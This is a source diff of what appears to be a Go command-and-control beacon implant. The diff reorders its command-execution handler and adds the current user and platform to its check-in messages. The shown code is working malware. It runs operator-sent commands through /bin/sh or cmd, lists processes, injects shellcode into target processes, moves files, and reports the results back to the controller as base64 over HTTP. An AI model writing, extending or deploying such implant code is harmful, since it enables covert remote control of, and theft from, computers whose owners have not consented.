@@ -17,7 +17,7 @@ import (
 )
 
 func (packet BeaconHttp) exitHandler() {
-	data, err := json.Marshal(CommandUpdate{ip,id,runtime.GOOS,runtime.GOARCH,"quit",[]byte("quit")})
+	data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,"quit",[]byte("quit")})
 	debugFatal(err)
 	encoded := b64.StdEncoding.EncodeToString(data)
 	queryCommandHttp(encoded)
@@ -60,46 +60,6 @@ func queryCommandHttp(endpoint string) (resp *http.Response, err error) {
 }
 
 func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
-	for _, cmd := range commResp.Exec {
-		cmdSplit := strings.Fields(cmd);
-		output := []byte{}
-		fmt.Println(cmdSplit[0] == "quit")
-		
-		if cmdSplit[0] == "exit" || cmdSplit[0] == "quit" {
-			packet.exitHandler()
-		}
-		fmt.Println(cmdSplit)
-		if cmdSplit[0] == "plist" {
-			procs := "------------------------------\nPID\tPPID\tName\n------------------------------"
-			procList, _ := ps.Processes()
-			
-			for _, p := range procList {
-				procs += "\n" + strconv.Itoa(p.Pid()) + "\t" + strconv.Itoa(p.PPid()) + "\t" + p.Executable()
-			}
-
-			data, err := json.Marshal(CommandUpdate{ip,id,runtime.GOOS,runtime.GOARCH,"plist",[]byte(procs)})
-			debugFatal(err)
-			encoded := b64.StdEncoding.EncodeToString(data)
-			queryCommandHttp(encoded)
-			return
-		}
-		
-		if runtime.GOOS == "linux" {
-			command := []string{ "-c", cmd }
-			output, _ = exec.Command("/bin/sh", command...).Output()
-		} else if runtime.GOOS == "windows" {
-			command := []string { "/c", cmd }
-			output, _ = exec.Command("cmd", command...).Output()
-		}
-
-		if len(output) > 0 {
-			data, err := json.Marshal(CommandUpdate{ip,id,runtime.GOOS,runtime.GOARCH,"exec",output})
-			debugFatal(err)
-			encoded := b64.StdEncoding.EncodeToString(data)
-			queryCommandHttp(encoded)
-		}
-	}
-
 	for i := 0; i < len(commResp.Shellcode); i += 2 {
 		shellcode := commResp.Shellcode[i]
 		procId, err := strconv.Atoi(commResp.Shellcode[i+1])
@@ -136,6 +96,46 @@ func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
 		json.Unmarshal([]byte(client), &beacon)
 		fmt.Println("Adding proxy " + beacon.Id)
 		packet.addProxyClient(beacon)
+	}
+
+	for _, cmd := range commResp.Exec {
+		cmdSplit := strings.Fields(cmd);
+		output := []byte{}
+		fmt.Println(cmdSplit[0] == "quit")
+		
+		if cmdSplit[0] == "exit" || cmdSplit[0] == "quit" {
+			packet.exitHandler()
+		}
+		fmt.Println(cmdSplit)
+		if cmdSplit[0] == "plist" {
+			procs := "------------------------------\nPID\tPPID\tName\n------------------------------"
+			procList, _ := ps.Processes()
+			
+			for _, p := range procList {
+				procs += "\n" + strconv.Itoa(p.Pid()) + "\t" + strconv.Itoa(p.PPid()) + "\t" + p.Executable()
+			}
+
+			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,"plist",[]byte(procs)})
+			debugFatal(err)
+			encoded := b64.StdEncoding.EncodeToString(data)
+			queryCommandHttp(encoded)
+			return
+		}
+		
+		if runtime.GOOS == "linux" {
+			command := []string{ "-c", cmd }
+			output, _ = exec.Command("/bin/sh", command...).Output()
+		} else if runtime.GOOS == "windows" {
+			command := []string { "/c", cmd }
+			output, _ = exec.Command("cmd", command...).Output()
+		}
+
+		if len(output) > 0 {
+			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,"exec",output})
+			debugFatal(err)
+			encoded := b64.StdEncoding.EncodeToString(data)
+			queryCommandHttp(encoded)
+		}
 	}
 }
 
@@ -182,7 +182,7 @@ func (packet BeaconHttp) download(filePath string) {
 
 	result += ";" + targetDir + "/" + filename
 
-	data, err := json.Marshal(CommandUpdate{ip,id,runtime.GOOS,runtime.GOARCH,"upload", []byte(result)})
+	data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,"upload", []byte(result)})
 	debugFatal(err)
 	
 	if err != nil {
@@ -194,7 +194,7 @@ func (packet BeaconHttp) download(filePath string) {
 }
 
 func (packet BeaconHttp) upload(filename string) {
-	data, err := json.Marshal(CommandUpdate{ip,id,runtime.GOOS,runtime.GOARCH,"upload", []byte(filename)})
+	data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,"upload", []byte(filename)})
 	debugFatal(err)
 	
 	if err != nil {
